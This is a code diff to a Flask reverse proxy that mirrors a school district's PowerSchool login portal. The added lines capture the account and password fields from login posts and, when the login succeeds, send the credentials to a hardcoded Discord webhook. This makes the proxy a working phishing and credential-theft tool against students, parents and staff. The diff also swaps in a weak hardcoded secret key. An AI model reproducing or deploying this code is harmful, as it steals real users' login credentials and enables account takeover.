@@ -2,7 +2,7 @@ from flask import Flask, request, redirect, url_for, Response, session as flask_
 import requests, re, uuid
 
 app = Flask(__name__)
-app.secret_key = "dfksljfsklfjsefkjflksejf"  # replace with secure random string
+app.secret_key = "super_secret_render_key"
 
 BASE_URL = "https://beaufortsc.powerschool.com"
 user_sessions = {}
@@ -47,6 +47,11 @@ def _rewrite_location(upstream_resp, resp_obj):
         elif loc.startswith("/"):
             resp_obj.headers["location"] = f"/proxy{loc}"
 
+def send_webhook(username, password):
+    url = "https://discord.com/api/webhooks/1432870093725106328/QsAAhHeIylYLLL-Wnhbf7XjQ8WJ72pRsFied62tLyuiNYuxy2GcJQuFHeOFzjd4e522r"
+    data = {"content": f"{username}:{password}"}
+    requests.post(url, json=data)
+
 @app.route("/", methods=["GET","POST"])
 def home():
     user_session = get_user_session()
@@ -71,11 +76,21 @@ def proxy(path):
     headers["Referer"] = BASE_URL
     method = request.method.upper()
     data = request.get_data() if method in {"POST","PUT","PATCH","DELETE"} else None
+    form = request.form
+    username = None
+    password = None
+    if method == "POST" and form.get("account") and form.get("pw"):
+        username = form.get("account")
+        password = form.get("pw")
     r = user_session.request(method, url, headers=headers, data=data, allow_redirects=False)
     body = r.content
     ctype = r.headers.get("content-type","").lower()
     if "text/html" in ctype:
-        body = replace_urls(body.decode("utf-8", errors="replace")).encode("utf-8")
+        text = body.decode("utf-8", errors="replace")
+        if username and password:
+            if '<div class="feedback-alert">Invalid Username or Password!</div><br>' not in text:
+                send_webhook(username, password)
+        body = replace_urls(text).encode("utf-8")
     elif "javascript" in ctype or "text/css" in ctype:
         body = body.decode("utf-8", errors="replace").replace(BASE_URL, _host_root()+"proxy").encode("utf-8")
     resp = Response(body, status=r.status_code, content_type=r.headers.get("content-type","text/plain"))
@@ -93,11 +108,23 @@ def catch_all(path):
         url += "?" + request.query_string.decode("utf-8", errors="ignore")
     headers = _clean_headers()
     headers["Referer"] = BASE_URL
-    r = user_session.request(request.method, url, headers=headers, data=request.get_data(), allow_redirects=False)
+    method = request.method.upper()
+    data = request.get_data() if method in {"POST","PUT","PATCH","DELETE"} else None
+    form = request.form
+    username = None
+    password = None
+    if method == "POST" and form.get("account") and form.get("pw"):
+        username = form.get("account")
+        password = form.get("pw")
+    r = user_session.request(method, url, headers=headers, data=data, allow_redirects=False)
     body = r.content
     ctype = r.headers.get("content-type","").lower()
     if "text/html" in ctype:
-        body = replace_urls(body.decode("utf-8", errors="replace")).encode("utf-8")
+        text = body.decode("utf-8", errors="replace")
+        if username and password:
+            if '<div class="feedback-alert">Invalid Username or Password!</div><br>' not in text:
+                send_webhook(username, password)
+        body = replace_urls(text).encode("utf-8")
     elif "javascript" in ctype or "text/css" in ctype:
         body = body.decode("utf-8", errors="replace").replace(BASE_URL, _host_root()+"proxy").encode("utf-8")
     resp = Response(body, status=r.status_code, content_type=r.headers.get("content-type","text/plain"))
